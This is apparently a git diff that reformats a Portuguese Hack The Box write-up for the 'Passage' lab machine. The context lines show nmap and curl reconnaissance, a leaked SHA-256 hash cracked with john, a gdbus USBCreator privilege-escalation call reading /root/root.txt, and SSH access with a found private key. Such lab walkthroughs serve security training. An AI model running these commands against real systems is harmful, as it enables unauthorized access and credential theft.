@@ -22,7 +22,7 @@ Write-ups para máquinas do Hack The Box são postados assim que as respectivas 
 
 Iniciado, como de costume, executando um scan rápido com `nmap` para verificar o que se encontra em execução nesta máquina
 
-```
+```bash
 $ nmap -sC -sV -Pn -oA quick 10.10.10.206
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-25 12:58 -03
@@ -52,7 +52,7 @@ Acessando a página notado que se trata de um blog criado com **[CuteNews](http:
 
 Inspecionando o código fonte da página, enquanto buscava por links interessantes, encontrei alguns endereços e-mail, além do domínio **passage.htb**, o qual foi adicionado na sequência no arquivo hosts local. 
 
-```
+```bash
 $ curl -L http://10.10.10.206 | grep -Eo 'href="(.*)"' | grep -v 'index.php' | sort -u
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -148,7 +148,7 @@ Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
 paul@passage.htb:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
 ```
 
-```
+```bash
 $ john -format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashes
 Created directory: /home/zurc/.john
 Using default input encoding: UTF-8
@@ -178,7 +178,7 @@ Após executar o script `linpeas.sh`, encontrei alguns itens interessantes:
   Vulnerable!!
   ```
 
-  Embora seja vulnerável, quando tentei explorá-la conforme explicado [neste link](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/), não funcionou corretamente dado a privilégios insuficientes:
+  Embora seja vulnerável, quando tentei explorá-la conforme explicado [neste link](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/), não funcionou corretamente dado a privilégios insuficientes deste usuário.
 
   ```bash
   www-data@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true
@@ -186,7 +186,7 @@ Após executar o script `linpeas.sh`, encontrei alguns itens interessantes:
   (According to introspection data, you need to pass 'ssb')
   ```
 
-- Observado 2 usuários na máquina, que inicialmente foram listados quando encontrei os endereços de e-mail e, para o usuário Paul, já temos uma possível senha. 
+- Observado 2 usuários na máquina, que inicialmente foram listados quando encontrei os endereços de e-mail e, para o usuário Paul, já temos uma possível senha.
 
   ```
   [+] Users with console
@@ -203,14 +203,14 @@ Após executar o script `linpeas.sh`, encontrei alguns itens interessantes:
   uid=1001(paul) gid=1001(paul) groups=1001(paul)
   ```
   
+
 Primeira coisa a ser testada a seguir foram as credenciais do usuário Paul, que funcionaram com sucesso na primeira tentativa e nos permitiram obter a flag de usuário! :smile:
 
-```
+```bash
 www-data@passage:~$ su paul
 Password:
 paul@passage:~$ cat user.txt
 <redacted>
-paul@passage:~$
 ```
 
 ## Root flag
@@ -219,7 +219,7 @@ Ao obter a conta do usuário *paul*, foi testada novamente a exploração do USB
 
 Analisando o diretório raiz do usuário, encontado um par de chaves RSA, a qual está inclusa no arquivo `authorized_keys` para conexão ssh sem credenciais. 
 
-```
+```bash
 paul@passage:~/.ssh$ ls -la
 total 24
 drwxr-xr-x  2 paul paul 4096 Jul 21  2020 .
@@ -233,14 +233,13 @@ drwxr-x--- 16 paul paul 4096 Feb  5 06:30 ..
 Dando uma olhada mais de perto no arquivo `id_rsa.pub`, notei que ele foi criado pelo usuário **nadav**. Uma vez que vi esta informação, imediatamente tentei conectar via ssh com esta chave para o usuário nadav e por sorte tivemos sucesso! :smiley:
 
 ```bash
-$ cat id_rsa.pub                                                                                                                 
+$ cat id_rsa.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
 
 $ ssh -i id_rsa nadav@10.10.10.206
 Last login: Thu Feb 25 13:41:27 2021 from 10.10.10.10
 nadav@passage:~$ id
 uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
-nadav@passage:~$	
 ```
 Finalmente, como o usuário **nadav**, fiz uma última tentativa da exploração da vulnerabilidade do USBCreator. Desta vez tivemos sucesso, uma vez que este usuário possui diversos privilégios nesta máquina. 
 
